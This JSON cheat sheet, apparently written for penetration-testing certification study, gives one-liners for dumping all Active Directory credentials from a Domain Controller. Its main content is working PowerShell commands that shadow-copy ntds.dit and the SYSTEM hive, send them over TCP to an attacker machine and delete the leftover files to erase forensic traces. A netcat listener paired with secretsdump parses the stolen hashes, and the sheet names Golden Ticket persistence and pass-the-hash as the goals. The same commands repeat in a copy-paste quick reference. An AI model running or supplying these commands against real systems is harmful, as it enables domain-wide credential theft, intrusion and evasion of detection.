{
  "cheatsheets": [
    {
      "id": "windows-ad-credential-oneliners",
      "name": "Windows AD Credential Extraction One-Liners",
      "description": "Complete Active Directory credential extraction one-liners combining VSS shadow copies, registry dumps, exfiltration, and offline parsing into single-command workflows for rapid pentest exploitation.",
      "category": "one-liners",
      "educational_header": {
        "how_to_recognize": [
          "You have local Administrator access on a Domain Controller",
          "DCSync unavailable (no replication rights) but need all domain credentials",
          "Need to exfiltrate NTDS.dit + SYSTEM without manual multi-step process",
          "Time-critical credential extraction requiring minimal keystrokes",
          "Network connectivity exists from DC to your Kali attack machine"
        ],
        "when_to_look_for": [
          "POST-EXPLOITATION: After gaining DC local admin (Evil-WinRM, PSExec, RDP)",
          "CREDENTIAL HARVESTING: When DCSync fails but need complete domain dump",
          "security assessment: Maximum credential harvest with minimum time investment",
          "LATERAL MOVEMENT PREP: Extracting hashes for mass Pass-the-Hash campaigns",
          "GOLDEN TICKET: Need krbtgt hash for Kerberos persistence"
        ],
        "prerequisites": [
          "Local Administrator on Domain Controller",
          "PowerShell 5.0+ on target (for Compress-Archive)",
          "vshadow.exe uploaded to DC (or use vssadmin variant)",
          "Network connectivity: DC can reach Kali on specified port",
          "Netcat + Impacket on Kali"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario: Complete NTDS.dit Extraction + TCP Exfil + Parse (One-liner Combo)",
          "context": "You have an Evil-WinRM session as local admin on DC01. Need to extract ALL domain credentials for lateral movement and Golden Ticket persistence. DCSync unavailable (user lacks replication rights). Network connectivity exists from DC to your Kali on port 9001.",
          "approach": "TWO-PHASE ONE-LINER WORKFLOW:\n\nPhase 1 - Attacker (Kali): Start listener FIRST\n- Run nc listener with auto-unzip and secretsdump parsing\n- Listener waits for incoming zip file from DC\n\nPhase 2 - Target (DC): Execute PowerShell one-liner\n- Single command creates VSS shadow, extracts ntds.dit + SYSTEM\n- Compresses both files to zip, sends via TCP socket\n- Auto-cleans all artifacts on DC\n\nPhase 3 - Automatic Parsing\n- Listener receives zip, auto-extracts, runs secretsdump\n- All domain credentials printed to terminal\n- krbtgt hash extracted for Golden Ticket",
          "commands": [
            "post-nc-receive-zip-secretsdump",
            "post-vss-ntds-exfil-combo"
          ],
          "expected_outcome": "Complete domain credential extraction in <5 minutes. Output: All NTLM hashes in domain\\user:RID:LM:NTLM format, Kerberos keys (AES256, AES128), krbtgt hash for Golden Ticket. No artifacts remain on DC after execution.",
          "why_this_works": "Combines 8+ manual steps into single PowerShell execution. VSS shadow copy bypasses locked NTDS.dit file. TCP socket exfil avoids SMB server setup complexity. Compress-Archive reduces transfer size and simplifies file handling. Auto-cleanup removes forensic artifacts."
        },
        {
          "title": "Scenario: Native vssadmin Variant (No vshadow.exe Required)",
          "context": "Same as above but vshadow.exe not uploaded to DC. Need to use native Windows utilities only for LOLBAS approach.",
          "approach": "Same two-phase workflow but replace vshadow.exe with native vssadmin:\n\n1. Attacker side identical (nc listener)\n2. Target one-liner uses vssadmin create shadow /for=C: instead of vshadow.exe\n3. Slightly slower shadow creation (30-60s vs 5-10s) but no upload needed",
          "commands": [
            "post-nc-receive-zip-secretsdump"
          ],
          "expected_outcome": "Same credential output with ~30 second additional shadow creation time. Zero tool uploads - pure living-off-the-land approach.",
          "why_this_works": "vssadmin is native Windows utility (no upload IOC). Writers enabled by default (cannot use -nw flag) adds time but maintains functionality. Ideal when file uploads blocked or for reduced forensic footprint."
        }
      ],
      "sections": [
        {
          "title": "VSS NTDS.dit Extraction + TCP Exfil One-Liners",
          "notes": "Complete AD credential extraction one-liners for certification.\n\nWORKFLOW:\n1. START LISTENER FIRST on Kali (critical - TCP is one-shot)\n2. Execute target-side PowerShell one-liner on DC\n3. Wait for transfer (30sec-2min depending on NTDS.dit size)\n4. Credentials auto-extracted and displayed\n\ncertification EXAM RELEVANCE: HIGH\n- Alternative to DCSync when replication rights unavailable\n- Complete domain dump in single command execution\n- Provides krbtgt hash for Golden Ticket persistence\n- Works on any DC with local admin access\n\nCOMMON USE CASES:\n- Post-exploitation credential harvesting on DC\n- Lateral movement preparation (mass PTH)\n- Golden Ticket creation for persistence\n- Offline hash cracking (hashcat -m 1000)\n\nTIME ESTIMATES:\n- vshadow variant: 2-4 minutes total\n- vssadmin variant: 3-5 minutes total\n- Parsing: <1 minute regardless of domain size",
          "commands": [
            {
              "id": "post-nc-receive-zip-secretsdump",
              "example": "nc -lvnp 9001 -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL",
              "shows": "Listening on 0.0.0.0 <PORT>"
            },
            {
              "id": "post-vss-ntds-exfil-combo",
              "example": "$DRIVE=\"C:\"; $LHOST=\"192.168.45.xxx\"; $LPORT=9001; $VSHADOW=\"C:\\Tools\\vshadow.exe\"; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force",
              "shows": "Shadow copy set succesfully created (vshadow output)"
            }
          ]
        },
        {
          "title": "Quick Reference - Copy-Paste Commands",
          "notes": "STEP 1 - KALI (start first):\nnc -lvnp 9001 -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL\n\nSTEP 2 - DC (with vshadow.exe):\n$DRIVE=\"C:\"; $LHOST=\"<YOUR_KALI_IP>\"; $LPORT=9001; $VSHADOW=\"C:\\Tools\\vshadow.exe\"; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force\n\nSTEP 2 - DC (native vssadmin - no upload):\n$DRIVE=\"C:\"; $LHOST=\"<YOUR_KALI_IP>\"; $LPORT=9001; $out=vssadmin create shadow /for=$DRIVE | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force\n\nKEY HASHES TO EXTRACT:\n- Administrator:500 - Domain Admin for PTH\n- krbtgt:502 - Golden Ticket creation\n- Service accounts - Often crackable passwords",
          "commands": [
            {
              "id": "post-nc-receive-zip-secretsdump",
              "example": "nc -lvnp 9001 -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL",
              "shows": "Listening on 0.0.0.0 <PORT>"
            },
            {
              "id": "post-vss-ntds-exfil-combo",
              "example": "$DRIVE=\"C:\"; $LHOST=\"192.168.45.xxx\"; $LPORT=9001; $VSHADOW=\"C:\\Tools\\vshadow.exe\"; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force",
              "shows": "Shadow copy set succesfully created (vshadow output)"
            }
          ]
        }
      ],
      "tags": [
        "ONE_LINER",
        "WINDOWS",
        "ACTIVE_DIRECTORY",
        "CREDENTIAL_ACCESS",
        "VSS",
        "NTDS",
        "TCP_EXFIL",
        "POWERSHELL",
        "QUICK_REFERENCE"
      ]
    }
  ]
}